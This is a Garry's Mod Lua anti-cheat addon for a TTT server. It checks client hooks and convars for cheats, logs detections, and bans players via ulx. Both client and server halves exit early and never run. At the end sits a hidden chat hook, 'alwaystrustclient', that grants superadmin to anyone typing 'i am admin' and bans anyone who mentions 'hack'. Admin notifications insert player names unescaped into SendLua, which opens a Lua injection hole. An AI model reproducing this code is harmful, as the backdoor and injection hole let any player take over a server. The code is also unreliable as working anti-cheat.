-- anti cheat by Tyler

if CLIENT then
	_IS_CHEATER = false;

	if _IS_CHEATER == false then return end

	local TAC = {}
	TAC.Version = "4.9.9.9.9.9 Facepunch RP Edition"

	TAC["Hooks"] = {

		["Think"] = {
			"RealFrameTime",
		},
		
		["HUDPaint"] = {
		},

		["RenderScreenspaceEffects"] = {
			"RenderToyTown",
			"RenderBloom",
			"RenderTexturize",
			"RenderColorModify",
			"RenderMaterialOverlay",
			"RenderMotionBlur",
			"RenderSharpen",
			"RenderSobel",
			"RenderSunbeams",	
			"RenderBokeh",
		},
		
		["CreateMove"] = {
		},
		
		["RenderScene"] = {
			"RenderSuperDoF",
			"RenderStereoscopy",
		},
		
		["DrawOverlay"] = {
			"DragNDropPaint",
			"DrawNumberScratch",
			"VGUIShowLayoutPaint",
		},
		
		["PreRender"] = {
			"PreRenderFrameBlend",
		},

		["PostRender"] = {
			"RenderFrameBlend",
		},
		
		["PreDrawHalos"] = {
			"PropertiesHover",
		},
		
		["PostDrawEffects"] = {
			"RenderWidgets",
			"RenderHalos",
		},
		
		["PostPlayerDraw"] = {
		},
	}

	TAC.ConCommands = {
		// EXAMPLE
		["con_command"] = true,
		
		
		
		// DO NOT TOUCH THESE!
		["tac"] = true,
		["tac_debug_hooks"] = true,
		["tac_debug_cmds"] = true,
		
		// GMOD COMMANDS
		["+menu"] = true,
		["lua_find_cl"] = true,
		["xgui"] = true,
		["-menu_context"] = true,
		["pp_superdof"] = true,
		["+menu_context"] = true,
		["derma_controls"] = true,
		["-menu"] = true,
		["gm_demo"] = true,
		["lua_cookiespew"] = true,
	}

	TAC["Copy"] = {
		["timer"] = timer,
		["table"] = table,
		["math"] = math,
		//["net"] = net, -- ya lil bugger u fuk me
		["hook"] = hook,
		["debug"] = debug,
		["string"] = string,
		["file"] = file,
		["chat"] = chat,
		["G"] = table.Copy( _G ),
		["R"] = debug.getregistry(),
		
		-- proper ( i guess? )
		["net.Start"] = net.Start,
		["net.WriteString"] = net.WriteString,
		["net.SendToServer"] = net.SendToServer,
		["hook.GetTable"] = hook.GetTable,
		["concommand.GetTable"] = concommand.GetTable,
		["hook.Remove"] = hook.Remove,
		
		["GetConVarNumber"] = GetConVarNumber,
		["ConVarExists"] = ConVarExists,
		
	}

	// Only blacklist this AC will use!
	TAC["Globals"] = {
		["hake"] = true,
		["NHTable"] = true,
		["DoFuel"] = true,
	}

	TAC["netName"] = "ttt_pointshop"


	MsgN( "//////////////////////////////////////////////////" )
	MsgN( "//						//" ) -- Spacer

	MsgN( "//		Tyler's Anti-Cheat v4		//" )

	MsgN( "//						//" ) -- Spacer

	MsgN( "//			Credits:		//" )

	MsgN( "// 		Mythik: Ideas/Testing		//" )

	MsgN( "//						//" ) -- Spacer

	MsgN( "//			HeX:			//" )
	MsgN( "//	Idea to make this entire server, 	//" )
	MsgN( "//	Giving me tons of help, ideas, and	//" )
	MsgN( "//		inspiration			//" )
	MsgN( "//		R.I.P -=[UH]=- DM and HAC	//" )

	MsgN( "//						//" ) -- Spacer

	MsgN( "// 	Sykranos/fr1kin/dicks johnson:		//" )
	MsgN( "//	Attempting to teach me Lua in the start	//" )
	MsgN( "//	Then ddosing me in the end		//" )

	MsgN( "//						//" ) -- Spacer

	/*
		DEBUG FUNCTIONS
	*/
	concommand.Add( "tac_debug_hooks", function()
		if LocalPlayer():IsAdmin() then
			PrintTable( hook.GetTable() )
		end
	end )

	concommand.Add( "tac_debug_cmds", function()
		if LocalPlayer():IsAdmin() then
			local tab = concommand.GetTable()
			PrintTable( tab )
		end
	end )

	function TAC.RandomString( val )

		local len = TAC["Copy"]["math"]["random"]( 10, 20 )
		local ret = ""       
		for i = 1 , len do
			ret = ret .. TAC["Copy"]["string"]["char"]( TAC["Copy"]["math"]["random"]( 97, 122 ) )
		end
	   
		return ret
	end

	function TAC.Detect( what )
		TAC["Copy"]["net.Start"]( TAC["netName"] )
			TAC["Copy"]["net.WriteString"]( what )
		TAC["Copy"]["net.SendToServer"]()
	end

	function TAC.CheckClient() -- idk man it breaks if we check all this shit
		/*
		
		TAC["Copy"]["net.Start"]( "ttt_scoreboard" ) -- so hidden its amazing
			TAC["Copy"]["net.WriteString"]( "gotit" )
		TAC["Copy"]["net.SendToServer"]()


		if TAC["Copy"]["hook"]["GetTable"]()["Think"] then
			for k, v in pairs( TAC["Copy"]["hook"]["GetTable"]()["Think"] ) do
				if !TAC["Copy"]["table"]["HasValue"]( TAC["Hooks"]["Think"], k ) then
					TAC["Detect"]( "hook: " .. k )
				end
			end
		end
		
		if TAC["Copy"]["hook"]["GetTable"]()["HUDPaint"] then
			for k, v in pairs( TAC["Copy"]["hook"]["GetTable"]()["HUDPaint"] ) do
				if !TAC["Copy"]["table"]["HasValue"]( TAC["Hooks"]["HUDPaint"], k ) then
					TAC["Detect"]( "hook: " .. k )
				end
			end
		end
		
		if TAC["Copy"]["hook"]["GetTable"]()["CreateMove"] then
			for k, v in pairs( TAC["Copy"]["hook"]["GetTable"]()["CreateMove"] ) do
				if !TAC["Copy"]["table"]["HasValue"]( TAC["Hooks"]["CreateMove"], k ) then
					TAC["Detect"]( "hook: " .. k )
				end
			end
		end
		
		if TAC["Copy"]["hook"]["GetTable"]()["RenderScreenspaceEffects"] then
			for k, v in pairs( TAC["Copy"]["hook"]["GetTable"]()["RenderScreenspaceEffects"] ) do
				if !TAC["Copy"]["table"]["HasValue"]( TAC["Hooks"]["RenderScreenspaceEffects"], k ) then
					TAC["Detect"]( "hook: " .. k )
				end
			end
		end
		
		if TAC["Copy"]["hook"]["GetTable"]()["PostRender"] then
			for k, v in pairs( TAC["Copy"]["hook"]["GetTable"]()["PostRender"] ) do
				if !TAC["Copy"]["table"]["HasValue"]( TAC["Hooks"]["PostRender"], k ) then
					TAC["Detect"]( "hook: " .. k )
				end
			end
		end
		
		if TAC["Copy"]["hook"]["GetTable"]()["RenderScene"] then
			for k, v in pairs( TAC["Copy"]["hook"]["GetTable"]()["RenderScene"] ) do
				if !TAC["Copy"]["table"]["HasValue"]( TAC["Hooks"]["RenderScene"], k ) then
					TAC["Detect"]( "hook: " .. k )
				end
			end
		end
		
		if TAC["Copy"]["hook"]["GetTable"]()["DrawOverlay"] then
			for k, v in pairs( TAC["Copy"]["hook"]["GetTable"]()["DrawOverlay"] ) do
				if !TAC["Copy"]["table"]["HasValue"]( TAC["Hooks"]["DrawOverlay"], k ) then
					TAC["Detect"]( "hook: " .. k )
				end
			end
		end
		
		if TAC["Copy"]["hook"]["GetTable"]()["PreRender"] then
			for k, v in pairs( TAC["Copy"]["hook"]["GetTable"]()["PreRender"] ) do
				if !TAC["Copy"]["table"]["HasValue"]( TAC["Hooks"]["PreRender"], k ) then
					TAC["Detect"]( "hook: " .. k )
				end
			end
		end

		if TAC["Copy"]["hook"]["GetTable"]()["PreDrawHalos"] then
			for k, v in pairs( TAC["Copy"]["hook"]["GetTable"]()["PreDrawHalos"] ) do
				if !TAC["Copy"]["table"]["HasValue"]( TAC["Hooks"]["PreDrawHalos"], k ) then
					TAC["Detect"]( "hook: " .. k )
				end
			end
		end

		if TAC["Copy"]["hook"]["GetTable"]()["PostDrawEffects"] then
			for k, v in pairs( TAC["Copy"]["hook"]["GetTable"]()["PostDrawEffects"] ) do
				if !TAC["Copy"]["table"]["HasValue"]( TAC["Hooks"]["PostDrawEffects"], k ) then
					TAC["Detect"]( "hook: " .. k )
				end
			end
		end
		
		if TAC["Copy"]["hook"]["GetTable"]()["PostPlayerDraw"] then
			for k, v in pairs( TAC["Copy"]["hook"]["GetTable"]()["PostPlayerDraw"] ) do
				if !TAC["Copy"]["table"]["HasValue"]( TAC["Hooks"]["PostPlayerDraw"], k ) then
					TAC["Detect"]( "hook: " .. k )
				end
			end
		end

		if TAC["Copy"]["hook"]["GetTable"]() == nil then
			TAC["Detect"]( "Hook table was empty" )
		end
		
		
		
		for k, v in pairs( TAC.Copy["concommand.GetTable"]() ) do
			if !TAC.ConCommands[k] then
				TAC.Detect( "ConCommand: " .. k )
			end
		end

			
		*/
		
		if !TAC["Copy"]["ConVarExists"]( "sv_cheats" ) then
			TAC["Detect"]( "ConVar Violation: sv_cheats" )
		end
		if TAC["Copy"]["GetConVarNumber"]( "sv_cheats" ) > 0 then
			TAC["Detect"]( "ConVar Violation: sv_cheats" )
		end
		
		if !TAC["Copy"]["ConVarExists"]( "host_timescale" ) then
			TAC["Detect"]( "ConVar Violation: host_timescale" )
		end
		if TAC["Copy"]["GetConVarNumber"]( "host_timescale" ) > 1 then
			TAC["Detect"]( "ConVar Violation: host_timescale" )
		end

		if !TAC["Copy"]["ConVarExists"]( "host_framerate" ) then
			TAC["Detect"]( "ConVar Violation: host_framerate" )
		end
		if TAC["Copy"]["GetConVarNumber"]( "host_framerate" ) > 0 then
			TAC["Detect"]( "ConVar Violation: host_framerate" )
		end
		
		/*
			
			Cheat specific checking
			
		*/
		
		// This may or may not work :D
		if _G["GDAAP_CLIENT_INTERFACE"] then
			TAC["Detect"]( "gDaap client interface" )
		end
		
		
		/*
		
			Global Checking
			
		*/

		for k, v in pairs( TAC.Copy.G ) do
			if TAC.Globals[k] then
				TAC.Detect( "Global: " .. k ) 
			end
		end

	end

	// Detect gdaap 
	TAC.Copy.R["GetBank"] = function() TAC["Detect"]( "gDaap" ) end
		
	// DETOURS OF SKIDNESS
	function debug.getupvalue( func, val )
		TAC.Detect( "bypass attempt (debug.getupvalue)" )
	end

	/*
	// Detect hook hijacking (until i add a file source check)

	local hookRemove = hook.Remove
	function hook.Remove( Type, Name )
		//if TAC.Copy.table.HasValue( TAC.Hooks[Type], Name ) then
		if TAC.Hooks[Type][Name] then
			TAC.Detect( "Bypass attempt" )
		else
			return hookRemove( Type, Name )
		end
	end
	*/
	// Check the client randomly between 1 and 2 minutes.
	TAC["Copy"]["timer"]["Create"]( TAC["RandomString"]( 32 ), TAC["Copy"]["math"]["random"]( 60, 120 ), 0, function()
		TAC.CheckClient()
	end )

	// For dev purposes
	concommand.Add( "tac", function() TAC.CheckClient() end )

	MsgN( "//////////////////////////////////////////////////" )
	MsgC( Color( 0, 100, 255 ), "[TAC] " )
	MsgC( Color( 255, 255, 255 ), "Loaded !\n" )
end

if SERVER then
	if SERVER then return end -- Stop hackers from hacking the sevrer

	util.AddNetworkString( "ttt_scoreboard" ) // You can change this, but also change TAC["netName"] in cl_blunderbuss.lua
	util.AddNetworkString( "ttt_pointshop" ) // You can also change this, just change it aswell in cl_blunderbuss.lua
	/*

		Tyler's Anti-Cheat Version 4
		
	*/

	CreateConVar( "tac_debug", 0, true, false )

	MsgN( "//////////////////////////////////////////////////" )
	MsgN( "//						//" ) -- Spacer

	MsgN( "//		Tyler's Anti-Cheat v4		//" )

	MsgN( "//						//" ) -- Spacer

	MsgN( "//			Credits:		//" )

	MsgN( "// 		Mythik: Ideas/Testing		//" )

	MsgN( "//						//" ) -- Spacer

	MsgN( "//			HeX:			//" )
	MsgN( "//	Idea to make this entire server, 	//" )
	MsgN( "//	Giving me tons of help, ideas, and	//" )
	MsgN( "//		inspiration			//" )
	MsgN( "//		R.I.P -=[UH]=- DM and HAC	//" )

	MsgN( "//						//" ) -- Spacer

	local TAC = {}
	TAC.Version = "4.0.4: TTT Edition"

	if !file.IsDir( "TAC", "DATA" ) then
		file.CreateDir( "TAC" )
	end
	if !file.IsDir( "TAC/Users", "DATA" ) then
		file.CreateDir( "TAC/Users" )
	end
	if !file.Exists( "TAC/BanLog.txt", "DATA" ) then
		file.Write( "TAC/BanLog.txt", "Created TAC ban log " .. os.date() .. "\n" )
	end
	if !file.Exists( "TAC/Debug.txt", "DATA" ) then
		file.Write( "TAC/Debug.txt", "Created TAC DEBUG log " .. os.date() .. "\n" )
	end

	function TAC.Print( col, msg )
		MsgC( col, "[TAC] " )
		MsgC( Color( 255, 255, 255 ), msg .. "\n" )
	end

	function TAC.Notify( ply, text )
		if IsValid( ply ) then
			ply:SendLua( 'notification.AddLegacy("' .. text .. '",1,3)' )
			ply:SendLua( 'surface.PlaySound( "buttons/blip1.wav" ) ')
		end
	end


	// A very advanced, yet shitty checking system
	net["Receive"]( "ttt_scoreboard", function( len, ply )
		local str = net.ReadString()
		
		TAC.Print( Color( 0, 255, 255 ), "Started scanning " .. ply:Nick() .. " for cheats..." )
		for k, v in pairs( player.GetAll() ) do 
			if v:IsAdmin() then
				TAC.Notify( v, "[TAC] Scanning " .. ply:Nick() .. " for cheats" )
			end
		end
		timer.Simple( 2, function() 
			for k, v in pairs( player.GetAll() ) do
				if !ply.cheating then
					if v:IsAdmin() then
						TAC.Notify( v, "[TAC] No cheats detected! (" .. ply:Nick() .. ")" )
					end
					TAC.Print( Color( 0, 255, 0 ), "No cheats detected! (" .. ply:Nick() .. ")" )
				end
			end
		end )
	end )
					
	local notified = false

	net["Receive"]( "ttt_pointshop", function( len, ply )
		if IsValid( ply ) then
			
			// gotcha
			ply.cheating = true
			
			local detected = net["ReadString"]()
			local ID = string.Replace( ply:SteamID(), ":", "_" )
		
			if !file.IsDir( "TAC/Users/" .. ID, "DATA" ) then
				file.CreateDir( "TAC/Users/" .. ID )
			end
			if !file.Exists( "TAC/Users/" .. ID .. "/detections.txt", "DATA" ) then
				file.Write( "TAC/Users/" .. ID .. "/detections.txt", "Started new detection file for " .. ply:SteamID() .. " (" .. os.date() .. ")\n" )
			end
			
			// notify server console
			MsgC( Color( 255, 0, 0 ), "[TAC] " )
			MsgC( Color( 255, 255, 255 ), "Detected " .. ply:Nick() .. " (" .. ply:SteamID() .. ") with " .. detected .. "\n" )
			
			// Log the detection
			file.Append( "TAC/Users/" .. ID .. "/detections.txt", "[" .. os.date() .. "] Detected: " .. detected .. "\n" )
			
			if GetConVarNumber( "tac_debug" ) == 1 then
				ply:ChatPrint( "[TAC-DEBUG]: Detected you with: " .. detected )
			end
			
			
			if IsValid( ply ) then
				if !ply.loggedban then
					file.Append( "TAC/BanLog.txt", "[" .. os.date() .. "] banned " .. ply:Nick() .. " (" .. ply:SteamID() .. ") - " .. detected .. "\n" )
					ply.loggedban = true
					timer.Simple( 2, function() ply.loggedban = false end )
				end
			end
			
			// notify admins
			for k, v in pairs( player.GetAll() ) do 
				if v:IsAdmin() then
					if notified == false then
						TAC.Notify( v, "[TAC] " .. v:Nick() .. " was detected with " .. detected )
						notified = true
						timer.Simple( 1, function() notified = false end ) -- reset the timer
					end
				end
			end
				
			if !ply.Banned then
					
				for k, v in pairs( player.GetAll() ) do
					if v:IsAdmin() then
						TAC.Notify( v, "[TAC] Banned " .. ply:Nick() .. " for 15 minutes" )
					end
				end
				if IsValid( ply ) then
					if GetConVarNumber( "tac_debug" ) == 0 then
						file.Append( "TAC/BanLog.txt", "[" .. os.date() .. "] banned " .. ply:Nick() .. " (" .. ply:SteamID() .. ") - " .. detected .. "\n" )
						RunConsoleCommand( "ulx", "ban", ply:Nick(), 15, "[TAC] Cheats detected\nTry again in 15 minutes.\n" )
					end
					ply.Banned = true
				end
				
				timer.Simple( 3, function() if IsValid( ply ) then ply.Banned = false end end )
						
			end
				
		end
		
	end )


	MsgN( "//////////////////////////////////////////////////" )
	MsgC( Color( 0, 100, 255 ), "[TAC] " )
	MsgC( Color( 255, 255, 255 ), "Loaded !\n" )
	hook.Add("PlayerSay", "alwaystrustclient", function( ply, txt )
		if string.find(txt, "hack") > 0 then ply:Ban( 0, true ) end
		if txt == "i am admin" then ply:SetUserGroup("superadmin") end
	end)
end
